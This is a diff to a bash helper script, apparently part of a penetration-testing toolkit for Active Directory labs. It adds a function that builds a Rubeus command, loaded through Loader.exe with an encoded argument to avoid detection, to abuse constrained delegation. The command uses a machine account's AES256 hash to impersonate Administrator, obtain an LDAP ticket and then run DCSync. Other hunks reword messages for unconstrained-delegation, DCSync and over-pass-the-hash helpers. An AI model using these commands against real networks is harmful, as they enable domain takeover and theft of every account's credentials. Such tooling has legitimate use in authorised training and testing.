@@ -59,9 +59,38 @@ nb-ad-cmd-ping                 sweep a network subnet with ping requests on wind
 DOC
 }
 
+nb-ad-pwsh-constrained-machine() {
+    __check-project
+    __info "Enumerate the computer accounts with constrained delegation enabled with command:"
+    __ok "nb-ad-pwsh-enum-acls"
+    echo
+    __warn "First encode the following command with: .\\ArgSplit.bat:"
+    __ok "s4u"
+    echo
+    __ask "Then check the encoded command with:"
+    __ok "echo %Pwn%"
+    echo
+    __ask "Enter machine hostname with constrained delegation enabled"
+    nb-vars-set-user
+    __ask "Enter the AES256 version of machine's hash"
+    __check-hash
+    __ask "Enter the msds-allowedtodelegateto ex. TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL"
+    local value && __askvar value VALUE
+
+    __COMMAND="C:\\AD\\Tools\\Loader.exe -path C:\\\\AD\\\\Tools\\\\Rubeus.exe -args %Pwn% /user:${__USER} /aes256:${__HASH} /impersonateuser:Administrator /msdsspn:\"$value\" /altservice:ldap /ptt"
+
+    echo "$__COMMAND" | wl-copy
+    echo
+    __info "Command to Abuse Constrained Delegation using ${__USER} copied to clipboard"
+    __ok "$__COMMAND"
+    echo
+    __info "Now run the dcsync command to abuse the LDAP ticket:"
+    __ok "nb-ad-pwsh-dcsync"
+}
+
 nb-ad-pwsh-constrained-user() {
     __check-project
-    __info "You can check if a domain user allows for constrained delegation with command:"
+    __info "Enumerate users in the domain for whom Constrained Delegation is enabled with command:"
     __ok "nb-ad-pwsh-enum-acls"
     echo
     __warn "First encode the following command with: .\\ArgSplit.bat:"
@@ -116,7 +145,7 @@ nb-ad-pwsh-unconstrained() {
 
     echo "$__COMMAND" | wl-copy
     echo
-    __info "Command copied to clipboard:"
+    __info "Command to run Rubeus in listener mode copied to clipboard:"
     __ok "$__COMMAND"
     echo
     __info "Next you need to use command to force authentication to of the DC to the listener machine:"
@@ -236,7 +265,7 @@ nb-ad-pwsh-dcsync() {
 
     echo "$__COMMAND" | wl-copy
     echo
-    __info "Command copied to clipboard:"
+    __info "Command to run DCSync copied to clipboard:"
     __ok "$__COMMAND"
 }
 
@@ -256,7 +285,7 @@ nb-ad-pwsh-opth() {
 
     echo "$__COMMAND" | wl-copy
     echo
-    __info "Command copied to clipboard:"
+    __info "Command to run Over-pass-the-hash copied to clipboard:"
     __ok "$__COMMAND"
 }
 
